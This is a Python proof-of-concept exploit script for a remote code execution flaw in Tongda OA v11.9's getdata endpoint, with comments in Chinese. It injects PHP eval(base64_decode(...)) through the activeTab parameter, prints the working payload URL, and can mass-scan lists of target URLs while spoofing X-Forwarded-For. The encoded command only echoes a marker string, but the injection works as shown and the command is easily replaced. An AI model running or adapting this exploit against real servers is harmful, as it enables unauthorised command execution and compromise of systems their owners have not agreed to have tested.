'''
通达OA v11.9 getdata任意命令执行poc
'''
import argparse
import requests
import time

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
    "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
}

'''proxy可替换Req_Get的requests中的None'''


# proxy = {
#     "http" : "http://127.0.0.1:8080"
# }

def Req_Get(url):
    try:
        res = requests.get(url=url, headers=headers, verify=False, allow_redirects=False, timeout=5, proxies=None)
        res.encoding = 'utf-8'
    except:
        print("\033[1;31m网络出错！\033[0m")
    return res


def RCE_Check(url):
    print('\033[1;34m[!] 通达OA v11.9 getdata RCE探测：\033[0m')

    # base64加密的内容为"poctest"
    url_1 = url + '/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyBwb2N0ZXN0Ow==%22)))%3B/*&id=19%5C&module=Carouselimage'
    res_body = Req_Get(url_1)
    if 'poctest' in res_body.text:
        p = url + "存在RCE"
        print("\033[1;32m{}\033[0m".format(p))
        print(
            "payload : {}/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval("
            "base64_decode(%22ZWNobyBwb2N0ZXN0Ow==%22)))%3B/*&id=19%5C&module=Carouselimage".format(
                url))
    else:
        pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="通达OA v11.9 getdata RCE")

    parser.add_argument("-u", "--url", help="目标url, python TongDa.py -u http://xxx.com")
    parser.add_argument("-f", "--file", help="批量urls, python TongDa.py -f urls.txt")
    args = parser.parse_args()

    '''单个url扫描'''
    if args.url:
        print("\033[1;34m[!][!][!] {} Start\033[0m".format(args.url))
        try:
            RCE_Check(args.url)
        except:
            pass

    '''批量扫描'''
    if args.file:
        f = open(args.file, "r")
        urls = f.readlines()
        count = 0
        for i in urls:
            url = i.strip('\n')
            print("\033[1;34m[!][!][!] {} Start\033[0m".format(url))
            try:
                RCE_Check(url)
            except:
                pass
            count = count + 1
            print("进度:{0}%".format(round(count * 100 / len(urls))), end='\r')
            time.sleep(1)
